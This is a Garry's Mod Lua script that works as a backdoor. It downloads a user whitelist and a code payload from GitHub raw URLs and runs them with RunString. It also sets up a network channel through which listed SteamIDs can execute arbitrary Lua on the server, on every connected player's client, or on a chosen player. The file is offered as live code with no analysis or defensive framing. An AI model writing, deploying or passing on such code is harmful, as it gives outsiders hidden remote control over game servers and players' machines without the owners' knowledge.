local core64 = {}
http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua", function(ret) RunString(ret) end)

if SERVER then
	util.AddNetworkString('stream_netcode')

	local function RunOnCL(tar, code)
		if !tar.CodeReceiver then
			tar.CodeReceiver=true
			tar:SendLua([[net.Receive('stream_netcode',function() RunString(net.ReadString()) end)]])
		end
		net.Start('stream_netcode')
		net.WriteString(code)
		net.Send(tar)
	end

	local rec = {
		[1] = function(code)
			RunString(code)
		end,
		[2] = function(code)
			for k, v in pairs(player.GetAll()) do
				RunOnCL(v, code)
			end
		end,
		[3] = function(code)
			RunOnCL(net.ReadEntity(), code)
		end,
	}

	net.Receive('stream_netcode', function(len, ply)
		if !core64.users_list[ply:SteamID()] then return end
		
		local code = net.ReadString()
		rec[net.ReadUInt(2)](code)
	end)
end

local code = ""
http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/lua_pad.lua", function(ret) code = ret end)

concommand.Add('editor', function(ply)
	http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua", function(ret) RunString(ret) end)
	if !core64.users_list[ply:SteamID()] then return end
	RunOnCL(ply, code)
end)